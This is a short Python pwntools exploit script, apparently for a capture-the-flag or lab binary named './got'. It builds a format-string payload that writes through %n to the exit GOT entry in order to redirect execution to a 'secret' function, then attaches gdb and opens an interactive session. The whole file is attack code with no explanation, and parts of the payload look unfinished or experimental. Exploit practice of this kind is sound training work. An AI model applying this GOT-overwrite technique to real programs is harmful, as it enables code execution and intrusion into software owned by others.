from pwn import *
import struct

#x secret || objdump -t ./got
secret = 0x080491d6
exit_got = 0x804c014

p = process("./got")
buff = p32(exit_got)
#buff += p32(exit_got + 2)
buff += "AAAABBBB"
buff += "%4$30x"
buff += "%4$n"
#buff += "%30x"
#buff += "%5$n"
length = len(buff)
buff += "X"*(512-length)
gdb.attach(p)
p.sendline(buff)
p.interactive()
p.readall()

